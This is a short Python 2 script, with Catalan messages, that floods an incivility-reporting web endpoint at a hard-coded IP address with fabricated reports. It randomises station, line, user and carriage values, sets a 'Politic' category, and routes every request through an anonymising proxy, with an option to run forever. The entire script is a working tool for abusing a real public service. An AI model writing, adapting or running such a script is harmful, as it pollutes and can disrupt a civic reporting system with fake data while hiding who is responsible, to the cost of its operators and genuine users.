#/usr/bin/env python
import sys
import urllib,urllib2
from optparse import OptionParser
import time
import random

SERVER="82.223.133.97"
METHOD="addDenunciaIncivisme.aspx"

def sendReport(opener, data):
	return opener.open('http://{0}/{1}?{2}'.format(SERVER, METHOD, urllib.urlencode(data)))

def main(args):
	parser = OptionParser()
	parser.add_option("-x", "--host", 
			  action="store",
			  dest="proxy_host", default="127.0.0.1", type="string",
		          	help="proxy host to use", metavar="HOST")
	parser.add_option("-p", "--port",
		          action="store", dest="proxy_port", default=8118,
		          help="port of the proxy host", metavar="PORT")

	parser.add_option("-n", "--requests",
		          action="store", dest="requests", default=1, type="int",
		          help="Number of requests to do. 0 means infinite ;)")

	parser.add_option("-s", "--sleep",
		          action="store", dest="sleep", default=100, type="int",
		          help="Sleep for a while between requests in milliseconds")

	(options, args) = parser.parse_args()
	proxy_handler = urllib2.ProxyHandler({"http":"%s:%d" % (options.proxy_host, options.proxy_port)})
	opener = urllib2.build_opener(proxy_handler)

	i=0
	while options.requests == 0 or i < options.requests:
		params={
			'linia': random.randint(1,40),
			'estacio_inici': random.randint(1,40),
			'estacio_fi': random.randint(1,40),
			'usuari': random.randint(1,9999),
			'tipo_alerta': 11,
			'latitud': '9999',
			'longitud': '9999',
			'fecha': '201208101918', 
			'tipo_captaire': 'Politic',
			'detall_altres': 'l33t',
			'num_vago': random.randint(1,40)
		}
		sys.stdout.flush()
		sys.stdout.write('\rEnviant avis d\'incivisme politic :) %d/%d' % (i, options.requests))
		sys.stdout.flush()
		time.sleep(options.sleep/1000.0)
		try:
			response = sendReport(opener, params)
		except Exception:
			print "\nError de conexio, potser el proxy no esta configurat?"
			exit(0)
		i=i+1

if __name__ == "__main__" :
    main(sys.argv[1:])
